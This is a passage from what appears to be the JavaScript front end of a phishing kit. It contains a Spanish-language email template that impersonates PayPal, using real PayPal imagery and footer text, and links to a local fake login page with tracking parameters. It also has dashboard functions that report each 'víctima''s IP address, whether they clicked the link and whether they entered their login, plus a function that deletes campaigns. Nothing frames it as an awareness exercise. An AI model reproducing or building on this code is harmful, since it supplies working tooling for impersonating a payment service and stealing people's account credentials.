class="mob-mc-pad2"> En caso de que desconozca esta actividad, favor de dar clic<span>&nbsp;</span> <a href="./paypalLogin.html?linkcampaign=${res.result.linkcampaign}&linklogin=${res.result.linklogin}" align="left" style="border:none;margin:0px;padding:0px;font-family:Circular,'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:200;text-align:left;text-decoration:none;color:rgb(12, 14, 136)" target="_blank">aquí</a> <span>&nbsp;</span>para poder recuperar tu cuenta lo antes posible. <br><br>O bien dando clic en el siguiente botón </td></tr><tr> <td align="left" valign="bottom" bgcolor="#ffffff" style="padding: 33px 0px 0px 32px; border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;" class="mob-mc-pad3"> <table border="0" cellpadding="0" cellspacing="0" align="left" width="100%" class="table-main"> <tbody><tr> <td align="center" valign="top"> <table border="0" cellpadding="0" cellspacing="0" align="left"> <tbody><tr> <td align="center" valign="middle" style="line-height:0px"> <img src="https://pp.images.harmony.epsilon.com/NorthAmerica/NA/2017/May/NA05084/PurchaseProtection_Desktop_left.jpg" width="21" height="40" border="0" style="display:block; line-height:0px" alt=""> </td><td align="center" valign="middle" bgcolor="#006ebd"> <table width="100%" border="0" cellspacing="0" cellpadding="0"> <tbody> <tr> <td align="center" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 14px; color:#fffffe; padding: 0px 8px 0px 8px; line-height:14px"> <strong><a href="./paypalLogin.html?linkcampaign=${res.result.linkcampaign}&linklogin=${res.result.linklogin}" target="_blank" style="color:#ffffff; text-decoration:none;">Revisar mi cuenta</a></strong> </td></tr></tbody> </table> </td><td align="center" valign="middle" style="line-height:0px"> <img src="https://pp.images.harmony.epsilon.com/NorthAmerica/NA/2017/May/NA05084/PurchaseProtection_Desktop_right.jpg" width="19" height="40" border="0" style="display:block; line-height:0px" alt=""> </td></tr></tbody></table> </td></tr></tbody></table> </td></tr><tr> <td align="left" bgcolor="#ffffff" valign="middle" style="font-family: 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 14px; line-height:18px; text-decoration: none; color:#595959; padding: 20px 0px 20px 32px; border-left:1px solid #e3e3e3;border-right:1px solid #e3e3e3;" class="mob-mc-pad4"></td></tr><tr> <td align="left" valign="top"><a href="https://www.paypal.com/" target="_blank"><img src="https://storage.googleapis.com/stateless-dev-hostsites-cloud/2020/02/f477de01-paypal-credit-banner.jpg" alt="" width="698" height="120" style="display:block;" border="0" class="img"></a> </td></tr><tr> <td align="center" valign="middle"> <table border="0" cellpadding="0" cellspacing="0" width="100%" align="center" class="emailwrapto320-foo"> <tbody><tr> <td align="center" valign="middle" style="padding:8px 0px 8px 0px; border-bottom:solid 1px #d9d9d9;"> <table class="emailwrapto320-foo" width="100%" border="0" cellspacing="0" cellpadding="0" align="center"> <tbody><tr> <td class="emailnomob-foo" width="30"></td><td class="emailwrapto318-foo" align="left" style="padding: 10px 0px"><a class="footer-foo" href="https://www.paypal.com/" target="_blank" style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 13px; color: #666666; text-decoration: none;"><strong>Account</strong></a><span style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 11px; color: #666666;" class="emailnomob-foo">&nbsp;&nbsp;&nbsp;&nbsp;</span><a class="footer-foo" href="#" target="_blank" style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 13px; color: #666666; text-decoration: none;"><strong>Help</strong></a><span style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 11px; color: #666666;" class="emailnomob-foo">&nbsp;&nbsp;&nbsp;&nbsp;</span><a class="footer-foo" href="https://www.paypal.com/" target="_blank" style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 13px; color: #666666; text-decoration: none;"><strong>Fees</strong></a><span style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 11px; color: #666666;" class="emailnomob-foo">&nbsp;&nbsp;&nbsp;&nbsp;</span><a class="footer-foo" href="https://www.paypal.com/" target="_blank" style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 13px; color: #666666; text-decoration: none;"><strong>Privacy/Cookies</strong></a><span style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 13px; color: #666666;" class="emailnomob-foo">&nbsp;&nbsp;&nbsp;&nbsp;</span><a class="footer-foo" href="https://www.paypal.com/" target="_blank" style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 13px; color: #666666; text-decoration: none;"><strong>Apps</strong></a><span style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 11px; color: #666666;" class="emailnomob-foo">&nbsp;&nbsp;&nbsp;&nbsp;</span><a class="footer-foo" href="https://www.paypal.com/" target="_blank" style="font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 13px; color: #666666; text-decoration: none;"><strong>Shop</strong></a></td><td class="hide" align="center" width="145" style="padding: 10px 0px"> <a href="https://www.paypal.com/" target="_blank"><img src="https://pp.images.harmony.epsilon.com/NorthAmerica/NA/Triggers/0920_01_paypallogo-recov-footer.jpg" alt="PayPal logo" width="85" height="20" border="0" style="display:block;"></a> </td></tr></tbody></table> </td></tr><tr> <td align="center" valign="middle" style="padding:8px 0px 8px 0px;"> <table class="emailwrapto320-foo" width="100%" border="0" cellspacing="0" cellpadding="0" align="center"> <tbody><tr> <td class="emailnomob-foo" width="30"></td><td class="emailwrapto318-foo" align="left" style="padding: 10px 0px; font-family:'Helvetica Neue Light', 'HelveticaNeue-Light', 'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size:11px; color:#8c8c8c"> This message was sent to<span>&nbsp;</span><a href="mailto:${res.result.email}" target="_blank">${res.result.email}</a>. For immediate answers to your questions, visit our Help Center by clicking "Help" located on any PayPal page or email.<br><br>Copyright © 2020 PayPal, Inc. All rights reserved. PayPal is located at 2211 N. First St., San Jose, CA 95131. </td></tr></tbody></table> <table class="emailwrapto320-foo" width="100%" border="0" cellspacing="0" cellpadding="0" align="center"> <tbody><tr> <td class="emailnomob-foo" width="30"></td><td class="emailwrapto318-foo" align="left" style="padding: 10px 0px; font-family:'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size:11px; color:#8c8c8c"></td></tr></tbody></table> </td></tr></tbody></table> </td></tr></tbody></table> </td></tr></tbody></table> </td></tr></tbody></table>`
                    break;
            }
            modaltext.innerHTML = html;
        },
        error: function (error) {
            console.log("ERROR:" + JSON.stringify(error));
        }
    });

}

function verEstadisticas(event){
    let statusLink = "";
    let statusLogin = "";
    let modaltext = document.querySelector("#statistics-body");
    modaltext.innerHTML = "";
    let html = "";
    $.ajax({
        method: 'GET',
        url: `/api/campaign/${event.name}`,
        headers: {"Authorization": currentToken},
        cache: false,
        success: function (res) {
            console.log(res);
            if(res.result.linkcounter == 1){
                statusLink="Sí"
            }else{
                statusLink="No"
            }
            
            if(res.result.logincounter == 1){
                statusLogin="Sí"
            }else{
                statusLogin="No"
            }

            html = `<p><span style="font-size: 2em; color:rebeccapurple;"> Plataforma:</span><span  style="font-size: 2em; color: midnightblue;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${res.result.platform}</span></p>
            <p><span style="font-size: 2em; color:rebeccapurple;"> IP de la víctima:</span><span  style="font-size: 2em; color: midnightblue;">&nbsp;${res.result.ip}</span></p>
            <p><span style="font-size: 2em; color:rebeccapurple;"> ¿Ingresó al link?</span><span  style="font-size: 2em; color: midnightblue;">&nbsp;${statusLink}</span></p>
            <p><span style="font-size: 2em; color:rebeccapurple;"> Fecha de acceso:</span><span  style="font-size: 2em; color: midnightblue;">&nbsp;${res.result.datelink}</span></p>
            <p><span style="font-size: 2em; color:rebeccapurple;"> ¿Hizo login?</span><span  style="font-size: 2em; color: midnightblue;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${statusLogin}</span></p>
            <p><span style="font-size: 2em; color:rebeccapurple;"> Fecha de login</span><span  style="font-size: 2em; color: midnightblue;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${res.result.datelogin}</span></p>`
            modaltext.innerHTML = html;
        },
        error: function (error) {
            console.log("ERROR:" + JSON.stringify(error));
        }
    });
}

function deleteCampaign(event){
    $.ajax({
        method: 'DELETE',
        url: `/api/campaign/${event.name}`,
        headers: {"Authorization": currentToken},
        cache: false,
        success: function (res) {
            alert("Campaña eliminada con éxito");
            map();
        },
        error: function (error) {
            console.log("ERROR:" + JSON.stringify(error));
        }
    });
}

window.onload = function () {
    map();
}
